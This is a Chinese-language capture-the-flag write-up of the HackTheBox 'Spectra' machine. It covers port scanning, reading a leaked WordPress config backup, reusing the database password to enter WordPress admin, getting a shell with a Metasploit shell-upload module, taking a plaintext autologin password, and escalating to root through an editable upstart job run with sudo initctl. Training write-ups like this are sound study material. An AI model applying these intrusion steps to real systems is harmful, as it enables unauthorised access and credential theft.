# HackTheBox Spectra

  
  
&lt;!--more--&gt;  
```bash  
sudo nmap --min-rate 10000 -A -sS 10.129.248.82  
  
Host is up (0.14s latency).  
Not shown: 997 closed tcp ports (reset)  
PORT     STATE SERVICE VERSION  
22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)  
| ssh-hostkey:   
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)  
80/tcp   open  http    nginx 1.17.4  
|_http-server-header: nginx/1.17.4  
|_http-title: Site doesn&#39;t have a title (text/html).  
3306/tcp open  mysql   MySQL (unauthorized)  
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).  
TCP/IP fingerprint:  
OS:SCAN(V=7.94%E=4%D=4/15%OT=22%CT=1%CU=31117%PV=Y%DS=2%DC=T%G=Y%TM=661CEC3  
OS:A%P=x86_64-apple-darwin21.6.0)SEQ(SP=100%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A)SE  
OS:Q(SP=100%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=100%GCD=2%ISR=10E%TI=Z  
OS:%CI=Z%II=I%TS=A)SEQ(SP=101%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53A  
OS:ST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=  
OS:M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=  
OS:Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S&#43;%F=AS%RD=0%Q  
OS:=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%  
OS:T=40%W=0%S=Z%A=S&#43;%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD  
OS:=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S&#43;%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL  
OS:=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)  
  
Network Distance: 2 hops  
  
TRACEROUTE (using port 21/tcp)  
HOP RTT       ADDRESS  
1   109.26 ms 10.10.16.1  
2   150.71 ms 10.129.248.82  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 54.99 seconds  
```  
存在`80 22 3306`端口  
访问`80`端口，点击链接发现均跳转到了`spectra.htb`域名，在`/etc/hosts`添加  
利用`dirsearch`目录爆破，`/testing/`存在目录遍历  
`wp-config.php.save`存在数据库泄漏  
```bash  
define( &#39;DB_NAME&#39;, &#39;dev&#39; );  
  
/** MySQL database username */  
define( &#39;DB_USER&#39;, &#39;devtest&#39; );  
  
/** MySQL database password */  
define( &#39;DB_PASSWORD&#39;, &#39;devteam01&#39; );  
  
/** MySQL hostname */  
define( &#39;DB_HOST&#39;, &#39;localhost&#39; );  
  
/** Database Charset to use in creating database tables. */  
define( &#39;DB_CHARSET&#39;, &#39;utf8&#39; );  
  
/** The Database Collate type. Don&#39;t change this if in doubt. */  
define( &#39;DB_COLLATE&#39;, &#39;&#39; );  
```  
直接登陆`3306`，但是并不能连接，这里密码复用登陆后台  
用户名在首页处得到`administrator`  
进入后台后得知`WordPress 5.4.2`版本  
利用`msf`进行getshell  
`exploit/unix/webapp/wp_admin_shell_upload`  
`/opt/autologin.conf.orig`文件  
```orig  
# Copyright 2016 The Chromium OS Authors. All rights reserved.  
# Use of this source code is governed by a BSD-style license that can be  
# found in the LICENSE file.  
description   &#34;Automatic login at boot&#34;  
author        &#34;chromium-os-dev@chromium.org&#34;  
# After boot-complete starts, the login prompt is visible and is accepting  
# input.  
start on started boot-complete  
script  
  passwd=  
  # Read password from file. The file may optionally end with a newline.  
  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do  
    if [ -e &#34;${dir}/passwd&#34; ]; then  
      passwd=&#34;$(cat &#34;${dir}/passwd&#34;)&#34;  
      break  
    fi  
  done  
  if [ -z &#34;${passwd}&#34; ]; then  
    exit 0  
  fi  
  # Inject keys into the login prompt.  
  #  
  # For this to work, you must have already created an account on the device.  
  # Otherwise, no login prompt appears at boot and the injected keys do the  
  # wrong thing.  
  /usr/local/sbin/inject-keys.py -s &#34;${passwd}&#34; -k enter  
end script  
```  
利用`chatgpt`分析一下  
```bash  
这个脚本是用于在启动时自动登录的。下面是对脚本的解释：  
  
1. 脚本的目的是在系统启动完成后自动登录。  
2. 它会在启动完全完成后开始运行，也就是在 &#34;boot-complete&#34; 服务启动后。  
3. 脚本首先会尝试从两个可能的目录中读取密码文件：&#34;/mnt/stateful_partition/etc/autologin&#34; 和 &#34;/etc/autologin&#34;。如果找到密码文件，则会读取其中的密码。  
4. 如果成功读取到密码，则会使用 &#34;/usr/local/sbin/inject-keys.py&#34; 工具将密码注入到登录提示中。这样就可以实现自动登录。  
5. 脚本中的注释提到，为了让自动登录正常工作，你必须已经在设备上创建了一个账户。否则，在启动时不会显示登录提示，注入的键会执行错误的操作。  
```  
在`/etc/autologin/passwd`发现密码`SummerHereWeCome!!`  
在`katie`用户处发现user的`flag`，所以很大概率是`katie`的密码  
登陆成功后，`cat user.txt`  
```bash  
katie@spectra ~ $ sudo -l  
User katie may run the following commands on spectra:  
    (ALL) SETENV: NOPASSWD: /sbin/initctl  
```  
可以`root`权限执行`initctl`  
看一下可以编辑的服务`sudo initctl list`  
找到几个以`test`开头的可疑服务，进行查看一下  
所有的服务都在/etc/init  
```bash  
cat /etc/init/test.conf  
  
description &#34;Test node.js server&#34;  
author      &#34;katie&#34;  
  
start on filesystem or runlevel [2345]  
stop on shutdown  
  
script  
  
    export HOME=&#34;/srv&#34;  
    echo $$ &gt; /var/run/nodetest.pid  
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js  
  
end script  
  
pre-start script  
    echo &#34;[`date`] Node Test Starting&#34; &gt;&gt; /var/log/nodetest.log  
end script  
  
pre-stop script  
    rm /var/run/nodetest.pid  
    echo &#34;[`date`] Node Test Stopping&#34; &gt;&gt; /var/log/nodetest.log  
end script  
```  
直接利用`test.conf`进行提权  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404152214139.png)
`sudo initctl start test`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404152214125.png)

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/hackthebox-spectra/  

